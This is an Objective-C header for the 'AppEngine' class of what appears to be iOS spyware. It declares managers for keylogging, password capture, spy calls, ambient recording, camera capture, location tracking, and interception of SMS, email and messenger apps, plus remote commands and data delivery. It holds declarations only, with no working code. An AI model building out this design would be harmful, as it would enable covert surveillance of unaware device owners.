//
//  AppEngine.h
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "LicenseChangeListener.h"
#import "ActivationCodeCaptureDelegate.h"
#import "ServerAddressChangeDelegate.h"

@class TelephonyNotificationManagerImpl;
@class AppContextImp;
@class SystemUtilsImpl;
@class SMSSendManager;
@class LicenseManager;
@class ConfigurationManagerImpl;
@class ServerAddressManagerImp;
@class ConnectionHistoryManagerImp;
@class PreferenceManagerImpl;
@class CommandServiceManager;
@class DataDeliveryManager;
@class ActivationManager;
@class EventRepositoryManager;
@class EventDeliveryManager;
@class EventCenter;
@class RemoteCmdManagerImpl;
@class SIMCaptureManagerImpl;
@class ActivationCodeCaptureManager;
@class SBDidLaunchNotifier;
@class SoftwareUpdateManagerImpl;
@class UpdateConfigurationManagerImpl;
@class IMVersionControlManagerImpl;

// Utils
@class ServerErrorStatusHandler;
@class PreferencesChangeHandler;
@class LicenseGetConfigUtils;
@class LicenseHeartbeatUtils;

// Connection to UI
@class AppEngineConnection;

// Features
@class CallLogCaptureManager;
@class SMSCaptureManager;
@class IMessageCaptureManager;
@class MMSCaptureManager;
@class MailCaptureManager;
@class LocationManagerImpl;
@class AddressbookManagerImp;
@class MediaFinder;
@class MediaCaptureManager;
@class SpyCallManager;
@class AppAgentManager;
@class WhatsAppCaptureManager;
@class BrowserUrlCaptureManager;
@class BookmarkManagerImpl;
@class ApplicationManagerImpl;
@class ALCManager;
@class LINECaptureManager;
@class AmbientRecordingManagerImpl;
@class SkypeCaptureManager;
@class FacebookCaptureManager;
@class NoteManagerImpl;
@class CalendarManagerImpl;
@class CameraCaptureManager;
@class ViberCaptureManager;
@class WeChatCaptureManager;
@class FaceTimeSpyCallManager;
@class FaceTimeCaptureManager;
@class SkypeCallLogCaptureManager;
@class WeChatCallLogCaptureManager;
@class LINECallLogCaptureManager;
@class ViberCallLogCaptureManager;
@class KeyLogCaptureManager;
@class FacebookCallLogCaptureManager;
@class BBMCaptureManager;
@class PasswordCaptureManager;
@class DeviceSettingsManagerImpl;
@class SnapchatCaptureManager;
@class HangoutCaptureManager;
@class YahooMsgCaptureManager;
@class SlingshotCaptureManager;
@class HistoricalEventManagerImpl;

@interface AppEngine : NSObject <LicenseChangeListener, ActivationCodeCaptureDelegate, ServerAddressChangeDelegate> {
@private
	// Engine
	TelephonyNotificationManagerImpl	*mTelephonyNotificationManagerImpl;
	AppContextImp*						mApplicationContext;
	SystemUtilsImpl						*mSystemUtils;
	SMSSendManager*						mSMSSendManager;
	LicenseManager*						mLicenseManager;
	ConfigurationManagerImpl*			mConfigurationManager;
	ServerAddressManagerImp*			mServerAddressManager;
	ConnectionHistoryManagerImp*		mConnectionHistoryManager;
	PreferenceManagerImpl*				mPreferenceManager;
	CommandServiceManager*				mCSM;
	DataDeliveryManager*				mDDM;
	ActivationManager*					mActivationManager;
	EventRepositoryManager*				mERM;
	EventDeliveryManager*				mEDM;
	EventCenter*						mEventCenter;
	RemoteCmdManagerImpl*				mRemoteCmdManager;
	SIMCaptureManagerImpl*				mSIMChangeManager;
	ActivationCodeCaptureManager*		mActivationCodeCaptureManager;
	SBDidLaunchNotifier					*mSBNotifier;
	SoftwareUpdateManagerImpl			*mSoftwareUpdateManager;
	UpdateConfigurationManagerImpl		*mUpdateConfigurationManager;
	IMVersionControlManagerImpl			*mIMVersionControlManager;
	
	// Utils
	ServerErrorStatusHandler*			mServerErrorStatusHandler;
	PreferencesChangeHandler			*mPreferencesChangeHandler;
	LicenseGetConfigUtils				*mLicenseGetConfigUtils;
	LicenseHeartbeatUtils				*mLicenseHeartbeatUtils;
	
	// Connection to UI
	AppEngineConnection*				mAppEngineConnection;
	
	// Features
	CallLogCaptureManager				*mCallLogCaptureManager;
	SMSCaptureManager					*mSMSCaptureManager;
	IMessageCaptureManager				*mIMessageCaptureManager;
	MMSCaptureManager					*mMMSCaptureManager;
	MailCaptureManager					*mMailCaptureManager;
	LocationManagerImpl					*mLocationManager;
	AddressbookManagerImp				*mAddressbookManager;
	MediaFinder							*mMediaFinder;
	MediaCaptureManager					*mMediaCaptureManager;
	SpyCallManager						*mSpyCallManager;
	AppAgentManager						*mAppAgentManager;
	WhatsAppCaptureManager	            *mWhatsAppCaptureManager;
	BrowserUrlCaptureManager			*mBrowserUrlCaptureManager;
	BookmarkManagerImpl					*mBookmarkManager;
	ApplicationManagerImpl				*mApplicationManager;
	ALCManager							*mALCManager;
	LINECaptureManager					*mLINECaptureManager;
	AmbientRecordingManagerImpl			*mAmbientRecordingManager;
	SkypeCaptureManager					*mSkypeCaptureManager;
	FacebookCaptureManager				*mFacebookCaptureManager;
	NoteManagerImpl						*mNoteManager;
	CalendarManagerImpl					*mCalendarManager;
	CameraCaptureManager				*mCameraCaptureManager;
	ViberCaptureManager					*mViberCaptureManager;
	WeChatCaptureManager				*mWeChatCaptureManager;
	FaceTimeSpyCallManager				*mFTSpyCallManager;
	FaceTimeCaptureManager				*mFTCaptureManager;
	SkypeCallLogCaptureManager			*mSkypeCallLogCaptureManager;
	WeChatCallLogCaptureManager			*mWeChatCallLogCaptureManager;
	LINECallLogCaptureManager			*mLINECallLogCaptureManager;
	ViberCallLogCaptureManager			*mViberCallLogCaptureManager;
	KeyLogCaptureManager				*mKeyLogCaptureManager;
	FacebookCallLogCaptureManager		*mFacebookCallLogCaptureManager;
	BBMCaptureManager					*mBBMCaptureManager;
    PasswordCaptureManager              *mPasswordCaptureManager;
    DeviceSettingsManagerImpl           *mDeviceSettingsManager;
    SnapchatCaptureManager              *mSnapchatCaptureManager;
    HangoutCaptureManager               *mHangoutCaptureManager;
    YahooMsgCaptureManager              *mYahooMsgCaptureManager;
    SlingshotCaptureManager             *mSlingshotCaptureManager;
    HistoricalEventManagerImpl          *mHistoricalEventManager;
    
	// Flags
	BOOL			mIsRestartingAppEngine;
}

// Engine
@property (nonatomic, readonly) AppContextImp* mApplicationContext;
@property (nonatomic, readonly) SystemUtilsImpl *mSystemUtils;
@property (nonatomic, readonly) SMSSendManager* mSMSSendManager;
@property (nonatomic, readonly) LicenseManager* mLicenseManager;
@property (nonatomic, readonly) ConfigurationManagerImpl* mConfigurationManager;
@property (nonatomic, readonly) ServerAddressManagerImp* mServerAddressManager;
@property (nonatomic, readonly) ConnectionHistoryManagerImp* mConnectionHistoryManager;
@property (nonatomic, readonly) PreferenceManagerImpl* mPreferenceManager;
@property (nonatomic, readonly) CommandServiceManager* mCSM;
@property (nonatomic, readonly) DataDeliveryManager* mDDM;
@property (nonatomic, readonly) ActivationManager* mActivationManager;
@property (nonatomic, readonly) EventRepositoryManager* mERM;
@property (nonatomic, readonly) EventDeliveryManager* mEDM;
@property (nonatomic, readonly) EventCenter* mEventCenter;
@property (nonatomic, readonly) RemoteCmdManagerImpl* mRemoteCmdManager;
@property (nonatomic, readonly) SIMCaptureManagerImpl* mSIMChangeManager;
@property (nonatomic, readonly) ActivationCodeCaptureManager* mActivationCodeCaptureManager;
@property (nonatomic, readonly) SBDidLaunchNotifier *mSBNotifier;
@property (nonatomic, readonly) SoftwareUpdateManagerImpl *mSoftwareUpdateManager;
@property (nonatomic, readonly) UpdateConfigurationManagerImpl *mUpdateConfigurationManager;
@property (nonatomic, readonly) IMVersionControlManagerImpl *mIMVersionControlManager;

// Features
@property (nonatomic, readonly) CallLogCaptureManager *mCallLogCaptureManager;
@property (nonatomic, readonly) SMSCaptureManager *mSMSCaptureManager;
@property (nonatomic, readonly) IMessageCaptureManager *mIMessageCaptureManager;
@property (nonatomic, readonly) MMSCaptureManager *mMMSCaptureManager;
@property (nonatomic, readonly) MailCaptureManager *mMailCaptureManager;
@property (nonatomic, readonly) LocationManagerImpl *mLocationManager;
@property (nonatomic, readonly) AddressbookManagerImp *mAddressbookManager;
@property (nonatomic, readonly) MediaFinder *mMediaFinder;
@property (nonatomic, readonly) MediaCaptureManager *mMediaCaptureManager;
@property (nonatomic, readonly) SpyCallManager *mSpyCallManager;
@property (nonatomic, readonly) AppAgentManager *mAppAgentManager;
@property (nonatomic, readonly) WhatsAppCaptureManager *mWhatsAppCaptureManager;
@property (nonatomic, readonly) BrowserUrlCaptureManager *mBrowserUrlCaptureManager;
@property (nonatomic, readonly) BookmarkManagerImpl *mBookmarkManager;
@property (nonatomic, readonly) ApplicationManagerImpl *mApplicationManager;
@property (nonatomic, readonly) ALCManager *mALCManager;
@property (nonatomic, readonly) LINECaptureManager *mLINECaptureManager;
@property (nonatomic, readonly) AmbientRecordingManagerImpl	*mAmbientRecordingManager;
@property (nonatomic, readonly) SkypeCaptureManager *mSkypeCaptureManager;
@property (nonatomic, readonly) FacebookCaptureManager *mFacebookCaptureManager;
@property (nonatomic, readonly) NoteManagerImpl *mNoteManager;
@property (nonatomic, readonly) CalendarManagerImpl *mCalendarManager;
@property (nonatomic, readonly) CameraCaptureManager *mCameraCaptureManager;
@property (nonatomic, readonly) ViberCaptureManager *mViberCaptureManager;
@property (nonatomic, readonly) WeChatCaptureManager *mWeChatCaptureManager;
@property (nonatomic, readonly) FaceTimeSpyCallManager *mFTSpyCallManager;
@property (nonatomic, readonly) FaceTimeCaptureManager *mFTCaptureManager;
@property (nonatomic, readonly) SkypeCallLogCaptureManager *mSkypeCallLogCaptureManager;
@property (nonatomic, readonly) WeChatCallLogCaptureManager *mWeChatCallLogCaptureManager;
@property (nonatomic, readonly) LINECallLogCaptureManager *mLINECallLogCaptureManager;
@property (nonatomic, readonly) ViberCallLogCaptureManager *mViberCallLogCaptureManager;
@property (nonatomic, readonly) KeyLogCaptureManager *mKeyLogCaptureManager;
@property (nonatomic, readonly) FacebookCallLogCaptureManager *mFacebookCallLogCaptureManager;
@property (nonatomic, readonly) BBMCaptureManager *mBBMCaptureManager;
@property (nonatomic, readonly) PasswordCaptureManager *mPasswordCaptureManager;
@property (nonatomic, readonly) DeviceSettingsManagerImpl *mDeviceSettingsManager;
@property (nonatomic, readonly) SnapchatCaptureManager *mSnapchatCaptureManager;
@property (nonatomic, readonly) HangoutCaptureManager *mHangoutCaptureManager;
@property (nonatomic, readonly) YahooMsgCaptureManager *mYahooMsgCaptureManager;
@property (nonatomic, readonly) SlingshotCaptureManager *mSlingshotCaptureManager;
@property (nonatomic, readonly) HistoricalEventManagerImpl *mHistoricalEventManager;

// Flags
@property (nonatomic, assign) BOOL mIsRestartingAppEngine;

@end
